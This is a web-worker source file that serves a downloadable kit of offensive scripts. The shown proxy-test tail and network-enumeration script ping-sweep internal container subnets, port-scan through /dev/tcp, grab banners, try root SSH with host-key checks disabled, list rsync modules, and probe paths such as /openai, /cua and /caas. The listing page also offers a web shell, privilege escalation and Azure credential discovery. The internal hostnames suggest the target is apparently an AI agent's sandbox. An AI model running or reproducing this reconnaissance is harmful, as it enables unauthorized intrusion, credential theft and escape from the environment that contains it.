    print(f"\\n=== Testing: {target_url} ===")
    
    # Test HTTP proxy
    print("1. HTTP proxy test:")
    try:
        response = requests.get(target_url, proxies=proxies_http, timeout=10)
        print(f"   Status Code: {response.status_code}")
        print(f"   Headers: {dict(list(response.headers.items())[:5])}")  # First 5 headers
        print(f"   Content Length: {len(response.text)}")
        if response.text:
            print(f"   Content Preview: {response.text[:200]}...")
    except requests.exceptions.ProxyError as e:
        print(f"   Proxy Error: {e}")
    except requests.exceptions.ConnectionError as e:
        print(f"   Connection Error: {e}")
    except requests.exceptions.Timeout as e:
        print(f"   Timeout Error: {e}")
    except Exception as e:
        print(f"   Other Error: {e}")

    # Test SOCKS proxy (requires PySocks)
    print("2. SOCKS proxy test:")
    try:
        response = requests.get(target_url, proxies=proxies_socks, timeout=10)
        print(f"   Status Code: {response.status_code}")
        print(f"   Headers: {dict(list(response.headers.items())[:5])}")  # First 5 headers
        print(f"   Content Length: {len(response.text)}")
        if response.text:
            print(f"   Content Preview: {response.text[:200]}...")
    except Exception as e:
        print(f"   Error: {e}")

# Test basic socket connectivity to local domains
print("\\n=== Socket Connectivity Test ===")
local_endpoints = [
    ('proxy.local', 8889),
    ('proxy.local', 8888),
    ('chrome.local', 80),
    ('terminal.local', 80),
    ('apitoolbackend.local', 80),
    ('apitoolbackend.local', 9000),
]

for host, port in local_endpoints:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        result = sock.connect_ex((host, port))
        if result == 0:
            print(f"   {host}:{port} - REACHABLE")
        else:
            print(f"   {host}:{port} - UNREACHABLE (error: {result})")
        sock.close()
    except Exception as e:
        print(f"   {host}:{port} - ERROR: {e}")

# Test DNS resolution for local domains
print("\\n=== DNS Resolution Test ===")
local_domains = ['proxy.local', 'chrome.local', 'terminal.local', 'apitoolbackend.local', 'go']

for domain in local_domains:
    try:
        ip = socket.gethostbyname(domain)
        print(f"   {domain} -> {ip}")
    except Exception as e:
        print(f"   {domain} -> FAILED: {e}")

print("\\n=== Test Complete ===")
EOF

log "\${BLUE}[TEST]\${NC} Running Python proxy test"
python3 /tmp/proxy_test.py 2>&1 | tee -a "$OUTPUT_FILE"

log_section "TEST SUMMARY"

log "\${BLUE}[INFO]\${NC} Proxy connectivity test completed at $(date)"
log "\${BLUE}[INFO]\${NC} Results logged to: $OUTPUT_FILE"

# Analyze results
SUCCESS_INDICATORS=("200" "HTTP/1.1" "Content-Length" "text/html")
ERROR_INDICATORS=("Connection refused" "timeout" "error" "failed" "forbidden")

log ""
log "\${GREEN}[ANALYSIS]\${NC} Result Analysis:"

for indicator in "\${SUCCESS_INDICATORS[@]}"; do
    count=$(grep -ci "$indicator" "$OUTPUT_FILE" 2>/dev/null || echo "0")
    if [ "$count" -gt 0 ]; then
        log "  ✓ Found $count instances of '$indicator' - potential success"
    fi
done

for indicator in "\${ERROR_INDICATORS[@]}"; do
    count=$(grep -ci "$indicator" "$OUTPUT_FILE" 2>/dev/null || echo "0")
    if [ "$count" -gt 0 ]; then
        log "  ✗ Found $count instances of '$indicator' - potential failure"
    fi
done

log ""
log "\${BLUE}[NEXT STEPS]\${NC}"
log "1. Review the log file for successful proxy connections"
log "2. If http://go/ is accessible, proceed with sub-URI enumeration"
log "3. If connection fails, investigate proxy authentication or network restrictions"
log "4. Consider using Jupyter notebook for browser-based proxy testing"

# Create a simple status report
if grep -q "200\\|HTTP/1.1 200\\|Content-Length" "$OUTPUT_FILE" 2>/dev/null; then
    echo "STATUS: PROXY CONNECTION SUCCESSFUL" > /tmp/proxy_status.txt
    log "\${GREEN}[SUCCESS]\${NC} Proxy connection appears to be working!"
else
    echo "STATUS: PROXY CONNECTION FAILED" > /tmp/proxy_status.txt
    log "\${RED}[FAILURE]\${NC} No successful proxy connections detected"
fi

log "\${BLUE}[INFO]\${NC} Status saved to: /tmp/proxy_status.txt"`,

  'network-enum': `#!/bin/bash

# Network Subnet Analysis Script
# Targets: 172.30.0.* and 172.18.0.* subnets
# Discovers hosts, services, and open ports

OUTPUT_FILE="network_scan_$(date +%Y%m%d_%H%M%S).log"
RESULTS_DIR="network_scan_results_$(date +%Y%m%d_%H%M%S)"
TIMESTAMP=$(date)

# Colors
RED='\\033[0;31m'
GREEN='\\033[0;32m'
YELLOW='\\033[1;33m'
BLUE='\\033[0;34m'
CYAN='\\033[0;36m'
NC='\\033[0m'

# Create results directory
mkdir -p "$RESULTS_DIR"

log() {
    echo -e "$1" | tee -a "$OUTPUT_FILE"
}

log_section() {
    echo "" | tee -a "$OUTPUT_FILE"
    echo "===========================================" | tee -a "$OUTPUT_FILE"
    echo "$1" | tee -a "$OUTPUT_FILE"
    echo "===========================================" | tee -a "$OUTPUT_FILE"
}

# Optimized host discovery with known intelligence
ping_sweep() {
    local subnet="$1"
    local subnet_name="$2"
    local results_file="$RESULTS_DIR/live_hosts_\${subnet_name}.txt"
    
    log "\${BLUE}[PING SWEEP]\${NC} Discovering live hosts in $subnet"
    
    echo "# Live hosts in $subnet" > "$results_file"
    echo "# Discovered: $(date)" >> "$results_file"
    
    local live_count=0
    local scan_range
    
    # Optimize scan range based on known network information
    if [ "$subnet" = "172.30.0" ]; then
        # 172.30.0.0/28 = only 16 IPs (172.30.0.0 to 172.30.0.15)
        scan_range="0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15"
        log "\${YELLOW}[OPTIMIZED]\${NC} Scanning /28 subnet (16 IPs only)"
        
        # Add known hosts from ARP table
        echo "172.30.0.2" >> "$results_file"
        echo "172.30.0.3" >> "$results_file"  # Our IP
        echo "172.30.0.4" >> "$results_file"
        live_count=3
        log "\${GREEN}[KNOWN]\${NC} 172.30.0.2 (from ARP)"
        log "\${GREEN}[KNOWN]\${NC} 172.30.0.3 (our IP)"
        log "\${GREEN}[KNOWN]\${NC} 172.30.0.4 (from ARP)"
        
    elif [ "$subnet" = "172.18.0" ]; then
        # 172.18.0.0/16 = full range, but focus on interesting ranges
        scan_range=$(seq 1 254)
        
        # Add our known IP
        echo "172.18.0.11" >> "$results_file"  # Our IP
        echo "172.18.0.1" >> "$results_file"   # Gateway
        live_count=2
        log "\${GREEN}[KNOWN]\${NC} 172.18.0.1 (gateway)"
        log "\${GREEN}[KNOWN]\${NC} 172.18.0.11 (our IP)"
    else
        scan_range=$(seq 1 254)
    fi
    
    # Scan remaining IPs
    for i in $scan_range; do
        local ip="\${subnet}.\\$i"
        
        # Skip IPs we already know about
        if [ "$subnet" = "172.30.0" ] && [[ "$i" =~ ^(2|3|4)$ ]]; then
            continue
        fi
        if [ "$subnet" = "172.18.0" ] && [[ "$i" =~ ^(1|11)$ ]]; then
            continue
        fi
        
        # Show progress every 50 hosts for large ranges
        if [ "$subnet" = "172.18.0" ] && [ $((i % 50)) -eq 0 ]; then
            log "\${CYAN}[PROGRESS]\${NC} Scanning \\$ip..."
        fi
        
        # Ping with short timeout
        if timeout 2 ping -c 1 -W 1 "\\$ip" >/dev/null 2>&1; then
            echo "\\$ip" >> "\\$results_file"
            log "\${GREEN}[LIVE]\${NC} \\$ip is alive"
            ((live_count++))
        fi
    done
    
    log "\${BLUE}[SUMMARY]\${NC} Found \\$live_count live hosts in \\$subnet"
    echo "\\$live_count" > "\\$RESULTS_DIR/live_count_\${subnet_name}.txt"
}

# TCP port scanning function
port_scan() {
    local ip="$1"
    local scan_type="$2"
    local results_file="$RESULTS_DIR/portscan_\${ip//./_}.txt"
    
    log "\${BLUE}[PORT SCAN]\${NC} Scanning $ip ($scan_type)"
    
    echo "# Port scan results for $ip" > "$results_file"
    echo "# Scan type: $scan_type" >> "$results_file"
    echo "# Timestamp: $(date)" >> "$results_file"
    
    local ports
    case $scan_type in
        "quick")
            # Top common ports + known listening ports from our container
            ports="21,22,23,25,53,80,110,111,135,139,143,443,873,1384,8888,9000,38889,57399,51247,993,995,1723,3389,5900,8080,8443"
            ;;
        "web")
            # Web and proxy ports + known services
            ports="80,443,8080,8081,8443,8888,8889,9000,9001,9090,3000,5000,7000,1384,873"
            ;;
        "common")
            # Extended common ports + discovered services
            ports="21,22,23,25,53,80,110,111,135,139,143,443,873,1384,8888,9000,38889,57399,51247,993,995,1723,3389,5900,8080,8443,1433,3306,5432,6379,27017,11211,9200,9300"
            ;;
        "container")
            # Container-specific ports based on our services
            ports="22,80,443,873,1384,8080,8443,8888,8889,9000,9001,5000,3000,2375,2376,2377,4243,4244,6443,8080,10250,10255"
            ;;
    esac
    
    local open_ports=()
    
    for port in \${ports//,/ }; do
        if timeout 3 bash -c "echo >/dev/tcp/\\$ip/\\$port" 2>/dev/null; then
            echo "\\$port/tcp open" >> "\\$results_file"
            open_ports+=("\\$port")
            log "\${GREEN}[OPEN]\${NC} \\$ip:\\$port"
        fi
    done
    
    # Store open ports count
    echo "\${#open_ports[@]}" > "\\$RESULTS_DIR/openports_count_\${ip//./_}.txt"
    echo "\${open_ports[*]}" > "\\$RESULTS_DIR/openports_list_\${ip//./_}.txt"
    
    return \${#open_ports[@]}
}

# Service detection function
service_detection() {
    local ip="$1"
    local port="$2"
    local results_file="$RESULTS_DIR/service_\${ip//./_}_\${port}.txt"
    
    log "\${CYAN}[SERVICE]\${NC} Detecting service on $ip:$port"
    
    echo "# Service detection for $ip:$port" > "$results_file"
    echo "# Timestamp: $(date)" >> "$results_file"
    
    # HTTP detection
    if [[ "$port" =~ ^(80|443|8080|8081|8443|8888|8889|9000|9001|9090|3000|5000|7000)$ ]]; then
        log "\${BLUE}[HTTP]\${NC} Testing HTTP service on $ip:$port"
        
        local proto="http"
        [[ "$port" =~ ^(443|8443)$ ]] && proto="https"
        
        # HTTP request with timeout
        local http_response=$(timeout 10 curl -s -I -m 5 "$proto://$ip:$port/" 2>/dev/null | head -10)
        if [ -n "$http_response" ]; then
            echo "=== HTTP Response ===" >> "$results_file"
            echo "$http_response" >> "$results_file"
            
            # Extract server information
            local server=$(echo "$http_response" | grep -i "server:" | head -1)
            if [ -n "$server" ]; then
                log "\${GREEN}[HTTP]\${NC} $ip:$port - $server"
            fi
        fi
        
        # Try to get the page content
        local content=$(timeout 10 curl -s -m 5 "$proto://$ip:$port/" 2>/dev/null | head -20)
        if [ -n "$content" ]; then
            echo "=== Content Preview ===" >> "$results_file"
            echo "$content" >> "$results_file"
        fi
    fi
    
    # SSH detection
    if [ "$port" = "22" ]; then
        log "\${BLUE}[SSH]\${NC} Testing SSH service on $ip:$port"
        local ssh_banner=$(timeout 10 bash -c "echo | nc $ip $port" 2>/dev/null | head -1)
        if [ -n "$ssh_banner" ]; then
            echo "SSH Banner: $ssh_banner" >> "$results_file"
            log "\${GREEN}[SSH]\${NC} $ip:$port - $ssh_banner"
        fi
    fi
    
    # Generic banner grabbing
    local banner=$(timeout 5 bash -c "echo | nc $ip $port" 2>/dev/null | head -3)
    if [ -n "$banner" ]; then
        echo "=== Generic Banner ===" >> "$results_file"
        echo "$banner" >> "$results_file"
    fi
}

# Network interface analysis with discovered intelligence
analyze_interfaces() {
    log_section "NETWORK INTERFACE ANALYSIS"
    
    log "\${BLUE}[INFO]\${NC} Current network configuration:"
    ip addr show | tee -a "$OUTPUT_FILE"
    
    log ""
    log "\${BLUE}[INFO]\${NC} Routing table:"
    ip route show | tee -a "$OUTPUT_FILE"
    
    log ""
    log "\${BLUE}[INFO]\${NC} ARP table:"
    arp -a 2>/dev/null | tee -a "$OUTPUT_FILE" || cat /proc/net/arp | tee -a "$OUTPUT_FILE"
    
    # Known network intelligence
    log ""
    log "\${GREEN}[INTELLIGENCE]\${NC} Known network information:"
    log "  Our IP in 172.18.0.0/16: 172.18.0.11"
    log "  Our IP in 172.30.0.0/28: 172.30.0.3"
    log "  Gateway: 172.18.0.1"
    log "  DNS Server: 168.63.129.16 (Azure)"
    log "  Domain: ourb00wvaruu3f2ax1wm5vezuf.cx.internal.cloudapp.net"
    
    # Known ARP entries (other containers)
    log ""
    log "\${GREEN}[KNOWN HOSTS]\${NC} Discovered from ARP table:"
    log "  172.30.0.2 (MAC: 02:42:ac:1e:00:02) - Container"
    log "  172.30.0.4 (MAC: 02:42:ac:1e:00:04) - Container"
    
    # Store our network information
    echo "172.18.0.11" > "$RESULTS_DIR/our_ip_172_18.txt"
    echo "172.30.0.3" > "$RESULTS_DIR/our_ip_172_30.txt"
    echo -e "172.30.0.2\\n172.30.0.4" > "$RESULTS_DIR/known_arp_hosts.txt"
}

# Main enumeration function with optimized targeting
enumerate_subnet() {
    local subnet="$1"
    local subnet_name="$2"
    
    log_section "ENUMERATING SUBNET: $subnet"
    
    # Host discovery
    ping_sweep "$subnet" "$subnet_name"
    
    # Read discovered hosts
    local hosts_file="$RESULTS_DIR/live_hosts_\${subnet_name}.txt"
    local live_hosts=()
    
    if [ -f "$hosts_file" ]; then
        while IFS= read -r line; do
            [[ $line =~ ^#.*$ ]] && continue
            [ -z "$line" ] && continue
            live_hosts+=("$line")
        done < "$hosts_file"
    fi
    
    log "\${BLUE}[INFO]\${NC} Found \${#live_hosts[@]} live hosts in $subnet"
    
    # Port scanning for each live host with optimized scans
    for host in "\${live_hosts[@]}"; do
        log_section "SCANNING HOST: $host"
        
        # Container-specific scan for known container networks
        if [[ "$host" =~ ^172\\.30\\. ]] || [[ "$host" =~ ^172\\.18\\. ]]; then
            port_scan "$host" "container"
        fi
        
        # Quick scan
        port_scan "$host" "quick"
        
        # Web-focused scan
        port_scan "$host" "web"
        
        # Service detection for open ports
        local openports_file="$RESULTS_DIR/openports_list_\${host//./_}.txt"
        if [ -f "$openports_file" ]; then
            local open_ports_content=$(cat "$openports_file")
            for port in $open_ports_content; do
                service_detection "$host" "$port"
            done
        fi
    done
}

# Advanced service enumeration with known service patterns
advanced_enumeration() {
    local ip="$1"
    local port="$2"
    
    log "\${CYAN}[ADVANCED]\${NC} Advanced enumeration for $ip:$port"
    
    case $port in
        80|8080|8888|8889|9000)
            # Web service enumeration
            log "\${BLUE}[WEB]\${NC} Web service enumeration for $ip:$port"
            
            # Common web paths + Microsoft/OpenAI specific paths
            local web_paths=("/" "/admin" "/api" "/health" "/status" "/version" "/metrics" "/swagger" "/docs" 
                             "/go" "/cua" "/sb" "/strawberry" "/vm" "/logs" "/vmlogs" "/experiments" "/samples"
                             "/caas" "/containers" "/azure" "/openai" "/chrome" "/automation")
            
            for path in "\${web_paths[@]}"; do
                local response=$(timeout 5 curl -s -o /dev/null -w "%{http_code}" "http://$ip:$port$path" 2>/dev/null)
                if [ "$response" != "000" ]; then
                    echo "$path -> $response" >> "$RESULTS_DIR/web_enum_\${ip//./_}_\${port}.txt"
                    if [ "$response" = "200" ]; then
                        log "\${GREEN}[WEB]\${NC} $ip:$port$path -> $response"
                        
                        # Get content for interesting paths
                        if [[ "$path" =~ ^/(health|status|version|api|go)$ ]]; then
                            local content=$(timeout 5 curl -s "http://$ip:$port$path" 2>/dev/null | head -10)
                            if [ -n "$content" ]; then
                                echo "=== Content for $path ===" >> "$RESULTS_DIR/web_enum_\${ip//./_}_\${port}.txt"
                                echo "$content" >> "$RESULTS_DIR/web_enum_\${ip//./_}_\${port}.txt"
                            fi
                        fi
                    fi
                fi
            done
            ;;
        22)
            # SSH enumeration
            log "\${BLUE}[SSH]\${NC} SSH enumeration for $ip:$port"
            timeout 10 ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no root@$ip "echo SSH_CONNECTION_TEST" 2>&1 | head -5 >> "$RESULTS_DIR/ssh_enum_\${ip//./_}.txt"
            ;;
        873)
            # rsync enumeration (we know this service runs)
            log "\${BLUE}[RSYNC]\${NC} rsync enumeration for $ip:$port"
            timeout 10 rsync --list-only rsync://$ip:$port/ 2>&1 | head -20 >> "$RESULTS_DIR/rsync_enum_\${ip//./_}.txt"
            ;;
        1384)
            # Terminal server (discovered service)
            log "\${BLUE}[TERMINAL]\${NC} Terminal server enumeration for $ip:$port"
            timeout 5 curl -s -I "http://$ip:$port/" 2>&1 | head -10 >> "$RESULTS_DIR/terminal_enum_\${ip//./_}.txt"
            ;;
    esac
}

# Generate summary report
generate_summary() {
    local summary_file="$RESULTS_DIR/SUMMARY_REPORT.txt"
    
    log_section "GENERATING SUMMARY REPORT"
    
    echo "=== NETWORK ANALYSIS SUMMARY REPORT ===" > "$summary_file"
    echo "Generated: $(date)" >> "$summary_file"
    echo "Target Subnets: 172.30.0.0/24, 172.18.0.0/24" >> "$summary_file"
    echo "" >> "$summary_file"
    
    # Count live hosts
    local total_hosts=0
    for subnet in "172_30_0" "172_18_0"; do
        local count_file="$RESULTS_DIR/live_count_\${subnet}.txt"
        if [ -f "$count_file" ]; then
            local count=$(cat "$count_file")
            echo "Live hosts in \${subnet//_/.}.0/24: $count" >> "$summary_file"
            total_hosts=$((total_hosts + count))
        fi
    done
    
    echo "Total live hosts discovered: $total_hosts" >> "$summary_file"
    echo "" >> "$summary_file"
    
    # Interesting services found
    echo "=== INTERESTING SERVICES ===" >> "$summary_file"
    
    # Find hosts with web services
    for file in "$RESULTS_DIR"/service_*_80.txt "$RESULTS_DIR"/service_*_8080.txt "$RESULTS_DIR"/service_*_8888.txt "$RESULTS_DIR"/service_*_9000.txt; do
        if [ -f "$file" ]; then
            local host_port=$(basename "$file" .txt | sed 's/service_//' | sed 's/_/./g' | sed 's/\\(.*\\)\\.\\([0-9]*\\)$/\\1:\\2/')
            echo "Web service: $host_port" >> "$summary_file"
        fi
    done
    
    # Find hosts with SSH
    for file in "$RESULTS_DIR"/service_*_22.txt; do
        if [ -f "$file" ]; then
            local host=$(basename "$file" .txt | sed 's/service_//' | sed 's/_22$//' | sed 's/_/./g')
            echo "SSH service: $host:22" >> "$summary_file"
        fi
    done
    
    echo "" >> "$summary_file"
    
    # Top hosts by open ports
    echo "=== HOSTS BY OPEN PORTS ===" >> "$summary_file"
    for file in "$RESULTS_DIR"/openports_count_*.txt; do
        if [ -f "$file" ]; then
            local host=$(basename "$file" .txt | sed 's/openports_count_//' | sed 's/_/./g')
            local count=$(cat "$file")
            echo "$host: $count open ports" >> "$summary_file"
        fi
    done | sort -k2 -nr >> "$summary_file"
    
    log "\${GREEN}[SUMMARY]\${NC} Summary report generated: $summary_file"
    cat "$summary_file" | tee -a "$OUTPUT_FILE"
}

# Main execution
log "\${GREEN}Network Subnet Analysis Script\${NC}"
log "Started: $TIMESTAMP"
log "Target Subnets: 172.30.0.0/28 (16 IPs), 172.18.0.0/16"
log "Results Directory: $RESULTS_DIR"
log ""
log "\${YELLOW}[INTELLIGENCE]\${NC} Using known network information:"
log "  Our IPs: 172.18.0.11, 172.30.0.3"
log "  Known hosts: 172.30.0.2, 172.30.0.4 (from ARP)"
log "  Known services: 873,8888,9000,1384 (from netstat)"
log "  DNS: 168.63.129.16 (Azure DNS)"

# Analyze current network setup
analyze_interfaces

# Enumerate 172.30.0.0/28 subnet (priority - smaller, known hosts)
enumerate_subnet "172.30.0" "172_30_0"

# Enumerate 172.18.0.0/16 subnet  
enumerate_subnet "172.18.0" "172_18_0"

# Advanced analysis for interesting hosts
log_section "ADVANCED SERVICE ANALYSIS"

# Find all hosts with open ports and do advanced enumeration
for file in "$RESULTS_DIR"/openports_list_*.txt; do
    if [ -f "$file" ]; then
        local host=$(basename "$file" .txt | sed 's/openports_list_//' | sed 's/_/./g')
        local ports_content=$(cat "$file")
        
        for port in $ports_content; do
            advanced_enumeration "$host" "$port"
        done
    fi
done

# Generate final summary
generate_summary

log ""
log "\${GREEN}[COMPLETE]\${NC} Network enumeration completed at $(date)"
log "\${BLUE}[RESULTS]\${NC} All results saved in: $RESULTS_DIR"
log "\${BLUE}[LOG]\${NC} Main log file: $OUTPUT_FILE"

# Create quick access files
echo "# Quick Access - Live Hosts" > "$RESULTS_DIR/QUICK_LIVE_HOSTS.txt"
cat "$RESULTS_DIR"/live_hosts_*.txt | grep -v "^#" | sort -V >> "$RESULTS_DIR/QUICK_LIVE_HOSTS.txt"

echo "# Quick Access - Web Services" > "$RESULTS_DIR/QUICK_WEB_SERVICES.txt"
for file in "$RESULTS_DIR"/service_*_80.txt "$RESULTS_DIR"/service_*_8080.txt "$RESULTS_DIR"/service_*_8888.txt "$RESULTS_DIR"/service_*_9000.txt; do
    if [ -f "$file" ]; then
        local host_port=$(basename "$file" .txt | sed 's/service_//' | sed 's/_/./g' | sed 's/\\(.*\\)\\.\\([0-9]*\\)$/\\1:\\2/')
        echo "http://$host_port/" >> "$RESULTS_DIR/QUICK_WEB_SERVICES.txt"
    fi
done

log "\${YELLOW}[TIP]\${NC} Check QUICK_LIVE_HOSTS.txt and QUICK_WEB_SERVICES.txt for immediate results"`
};

// Function to get HTML content (files page only)
async function getHTMLContent() {
  return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shell Scripts Repository</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            color: #333;
        }
        .container {
            background: white;
            border-radius: 15px;
            padding: 30px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
            backdrop-filter: blur(10px);
        }
        h1 {
            color: #4A90E2;
            text-align: center;
            margin-bottom: 10px;
            font-size: 2.5em;
            background: linear-gradient(45deg, #4A90E2, #9B59B6);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        .subtitle {
            text-align: center;
            color: #666;
            margin-bottom: 30px;
            font-style: italic;
        }
        .files-section {
            background: #f8f9fa;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
            border-left: 4px solid #6c5ce7;
        }
        .files-list {
            list-style: none;
            padding: 0;
            margin: 15px 0 0 0;
        }
        .file-item {
            background: white;
            margin-bottom: 8px;
            padding: 12px 15px;
            border-radius: 6px;
            border-left: 3px solid #6c5ce7;
            transition: all 0.2s ease;
        }
        .file-item:hover {
            background: #f1f2f6;
            transform: translateX(5px);
        }
        .file-link {
            text-decoration: none;
            font-weight: bold;
            color: #2d3436;
            font-size: 16px;
            display: block;
            margin-bottom: 4px;
        }
        .file-link:hover {
            color: #6c5ce7;
        }
        .file-desc {
            color: #636e72;
            font-size: 13px;
            line-height: 1.4;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>📁 Shell Scripts Repository</h1>
        <p class="subtitle">Download security testing and system analysis scripts</p>

        <div class="files-section">
            <h3>📁 Available Shell Scripts</h3>
            <p>Click any script below to download it directly:</p>
            <ul class="files-list">
                <li class="file-item">
                    <a href="/files/basic-info" class="file-link">📋 basic-info.sh</a>
                    <div class="file-desc">Basic system information gathering - user context, network interfaces, running processes</div>
                </li>
                <li class="file-item">
                    <a href="/files/advanced-info" class="file-link" style="color: #e74c3c; font-weight: bold;">🔍 advanced-info.sh</a>
                    <div class="file-desc">Comprehensive system enumeration - detailed OS info, environment variables, virtualization detection, security configuration</div>
                </li>
                <li class="file-item">
                    <a href="/files/network-test" class="file-link" style="color: #f39c12; font-weight: bold;">🌐 network-test.sh</a>
                    <div class="file-desc">Network connectivity testing template - configure target IP and test various connection methods (for authorized testing)</div>
                </li>
                <li class="file-item">
                    <a href="/files/service-probe" class="file-link" style="color: #e74c3c; font-weight: bold;">🔍 service-probe.sh</a>
                    <div class="file-desc">Service analysis script - probes exposed ports (873, 8888, 9000, 1384) and identifies running services</div>
                </li>
                <li class="file-item">
                    <a href="/files/web-shell" class="file-link" style="color: #9c27b0; font-weight: bold;">🐍 web-shell.py</a>
                    <div class="file-desc">Simple command API server - GET /api/command?cmd=YOUR_COMMAND for instant results</div>
                </li>
                <li class="file-item">
                    <a href="/files/azure-enum" class="file-link" style="color: #0078d4; font-weight: bold;">☁️ azure-enum.sh</a>
                    <div class="file-desc">Azure Container IAM and Metadata Analysis - IMDS queries, managed identity checks, Azure CLI analysis, credential discovery</div>
                </li>
                <li class="file-item">
                    <a href="/files/privesc" class="file-link" style="color: #dc3545; font-weight: bold;">🔓 privesc.sh</a>
                    <div class="file-desc">Container Access Testing - supervisor control, init script analysis, rsync testing, Jupyter analysis, process examination</div>
                </li>
                <li class="file-item">
                    <a href="/files/internal-recon" class="file-link" style="color: #6f42c1; font-weight: bold;">🕵️ internal-recon.sh</a>
                    <div class="file-desc">Internal Infrastructure Analysis - proxy testing, go/ links discovery, VM-specific endpoints, authentication testing, network mapping</div>
                </li>
                <li class="file-item">
                    <a href="/files/ms-recon" class="file-link" style="color: #00bcf2; font-weight: bold;">🔍 ms-recon.sh</a>
                    <div class="file-desc">Microsoft Infrastructure Local Reconnaissance - environment analysis, process enumeration, Jupyter preparation, browser-based access planning</div>
                </li>
                <li class="file-item">
                    <a href="/files/proxy-test" class="file-link" style="color: #28a745; font-weight: bold;">🌐 proxy-test.sh</a>
                    <div class="file-desc">Proxy Connectivity Testing - HTTP/SOCKS proxy verification, local domain resolution, http://go/ access validation, Python-based testing</div>
                </li>
                <li class="file-item">
                    <a href="/files/network-enum" class="file-link" style="color: #17a2b8; font-weight: bold;">🔍 network-enum.sh</a>
                    <div class="file-desc">Network Subnet Analysis - 172.30.0.*/172.18.0.* host discovery, port scanning, service detection, web path testing, comprehensive reporting</div>
                </li>
            </ul>
        </div>
    </div>
</body>
</html>`;
}



export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    
    if (request.method === 'OPTIONS') {
      return new Response(null, {
        headers: {
          'Access-Control-Allow-Origin': '*',
          'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
          'Access-Control-Allow-Headers': 'Content-Type, Authorization',
        },
      });
    }

    const corsHeaders = {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type, Authorization',
    };

    if (url.pathname === '/') {
      const htmlContent = await getHTMLContent();
      return new Response(htmlContent, {
        headers: {
          'Content-Type': 'text/html',
          ...corsHeaders,
        },
      });
    }



    // Handle file downloads
    if (url.pathname.startsWith('/files/')) {
      const filename = url.pathname.substring(7); // Remove '/files/'
      const fileContent = STATIC_FILES[filename];
      
      if (fileContent) {
        let downloadFilename = filename;
        if (filename === 'web-shell') {
          downloadFilename = 'web-shell';
        } else if (!filename.includes('.')) {
          downloadFilename = filename;
        }
        
        return new Response(fileContent, {
          headers: {
            'Content-Type': 'application/octet-stream',
            'Content-Disposition': `attachment; filename="${downloadFilename}"`,
            ...corsHeaders,
          },
        });
      }
      
      return new Response('File not found', { 
        status: 404,
        headers: corsHeaders,
      });
    }

    // API endpoints for logging (kept for compatibility)
    if (url.pathname === '/api/log') {
      if (request.method === 'POST') {
        try {
          const logData = await request.json();
          console.log('Log entry:', logData);
          return new Response(JSON.stringify({ status: 'logged' }), {
            headers: {
              'Content-Type': 'application/json',
              ...corsHeaders,
            },
          });
        } catch (error) {
          return new Response('Invalid JSON', { 
            status: 400,
            headers: corsHeaders,
          });
        }
      }
    }

    return new Response('Not found', { 
      status: 404,
      headers: corsHeaders,
    });
  },
};